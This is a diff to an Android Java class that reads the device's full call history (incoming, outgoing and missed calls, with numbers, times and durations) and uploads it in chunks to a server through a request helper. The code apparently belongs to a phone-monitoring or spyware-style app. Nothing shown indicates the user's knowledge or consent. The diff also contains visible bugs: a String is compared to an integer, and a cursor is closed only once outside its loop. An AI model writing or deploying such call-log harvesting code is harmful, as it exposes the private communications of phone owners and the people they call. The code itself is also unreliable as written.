@@ -4,8 +4,11 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
+import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
 import android.os.AsyncTask;
+import android.preference.PreferenceManager;
 import android.provider.CallLog;
 
 import com.inet.android.db.RequestDataBaseHelper;
@@ -16,10 +19,13 @@ import com.inet.android.utils.Logging;
 public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	Context mContext;
 	RequestDataBaseHelper db;
-	private int iType = 0;
+	private String iType;
 	ConvertDate date;
 	private String LOG_TAG = "ArchiveCall";
-	private int type;
+	// private int type;
+	private String complete;
+	Editor ed;
+	SharedPreferences sp;
 
 	private String getDuration(long milliseconds) {
 		int seconds = (int) (milliseconds / 1000) % 60; // 280
@@ -31,16 +37,13 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	}
 
 	private String readCallLogs() {
-
-		// Вставляем контакты
-		Logging.doLog(LOG_TAG, "Insert: ", "Inserting ..");
-		// формируем JSONobj
-		JSONObject AllCallJson = new JSONObject();
+		String sendStr = null;
 		date = new ConvertDate();
 		Cursor callLogCursor = null;
 		// Делаем запрос к контент-провайдеру
 		// и получаем все данные из таблицы
-		for (int i = 0; i < 2; i++) {
+		for (int i = 0; i < 3; i++) {
+			complete = "0";
 			switch (i) {
 			case (0):
 				callLogCursor = mContext.getContentResolver().query(
@@ -50,7 +53,7 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 						new String[] { String
 								.valueOf(CallLog.Calls.INCOMING_TYPE) },
 						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
-				iType = 1;
+				iType = "1";
 				break;
 			case (1):
 				callLogCursor = mContext.getContentResolver().query(
@@ -60,7 +63,7 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 						new String[] { String
 								.valueOf(CallLog.Calls.OUTGOING_TYPE) },
 						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
-				iType = 2;
+				iType = "2";
 
 				break;
 			case (2):
@@ -71,13 +74,12 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 						new String[] { String
 								.valueOf(CallLog.Calls.MISSED_TYPE) },
 						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
-				iType = 3;
+						iType = "3";
 
 				break;
 			}
 			if (callLogCursor != null) {
 				JSONObject archiveCallJson = new JSONObject();
-				JSONObject infoCallJson = null;
 
 				// Проходим в цикле, пока не дойдём до последней записи
 				Logging.doLog(LOG_TAG, "callogCursor != 0 ..");
@@ -85,9 +87,6 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 				while (callLogCursor.moveToNext()) {
 					Logging.doLog(LOG_TAG, "callogCursor moveToNext ..");
 
-					// Идентификатор. В нашем примере не нужен
-					// String id = callLogCursor.getString(callLogCursor
-					// .getColumnIndex(CallLog.Calls._ID));
 					// Имя контакта
 					String name = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.CACHED_NAME));
@@ -101,9 +100,6 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 							.getColumnIndex(CallLog.Calls.DATE));
 					long durationMillis = callLogCursor.getLong(callLogCursor
 							.getColumnIndex(CallLog.Calls.DURATION));
-					// int callType = callLogCursor.getInt(callLogCursor
-					// .getColumnIndex(CallLog.Calls.TYPE));
-//					int isNew = callLogCursor.getColumnIndex(CallLog.Calls.NEW);
 
 					String duration = getDuration(durationMillis * 1000);
 
@@ -114,43 +110,51 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 					if (name == null)
 						name = "No Name";
 
-					// if (callType == CallLog.Calls.OUTGOING_TYPE) {
-					// iType = 3;
-					// } else if (callType == CallLog.Calls.INCOMING_TYPE) {
-					// iType = 2;
-					// } else if (callType == CallLog.Calls.MISSED_TYPE) {
-					// iType = 1;
-					// }
-					// Log.d("CallLog", number + " " + name + " " + cacheNumber
-					// +
-					// " "
-					// + dateString + " " + duration + " " + callType + " "
-					// + isNew);
 					try {
-
-						infoCallJson = new JSONObject();
-
 						archiveCallJson.put("time", dateString);
-						archiveCallJson.put("type", iType);
-						infoCallJson.put("number", number);
-						infoCallJson.put("duration", duration);
-						archiveCallJson.put("info", infoCallJson);
-						AllCallJson.put("data", archiveCallJson);
+						archiveCallJson.put("number", number);
+						if (!iType.equals(3))
+							archiveCallJson.put("duration", duration);
+						if (sendStr == null)
+							sendStr = archiveCallJson.toString();
+						else
+							sendStr += "," + archiveCallJson.toString();
+
 					} catch (JSONException e) {
 						// TODO Автоматически созданный блок catch
 						e.printStackTrace();
 					}
-				}
-				callLogCursor.close();
-
-				if (archiveCallJson.toString() != null) {
-					OnDemandRequest dr = new OnDemandRequest(mContext, type);
-					dr.sendRequest(archiveCallJson.toString());
-					Logging.doLog(LOG_TAG, AllCallJson.toString());
+					if (sendStr.length() >= 10000) {
+						Logging.doLog(LOG_TAG, "str >= 10000 ..",
+								"str >= 10000 ..");
+						sendRequest(sendStr, complete);
+						sendStr = null;
+					}
 				}
 			}
+			complete = "1";
+			Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
+			sendRequest(sendStr, complete);
+			sendStr = null;
 		}
+		Logging.doLog(LOG_TAG, "statusCallList 0.", "statusCallList 0.");
+
+		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		ed = sp.edit();
+		ed.putString("statusCallList", "0");
+		ed.commit();
+
+		callLogCursor.close();
+
 		return null;
+	}
+
+	private void sendRequest(String str, String complete) {
+		if (str != null) {
+			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
+			dr.sendRequest(str);
+			// Logging.doLog(LOG_TAG, str, str);
+		}
 	}
 
 	@Override
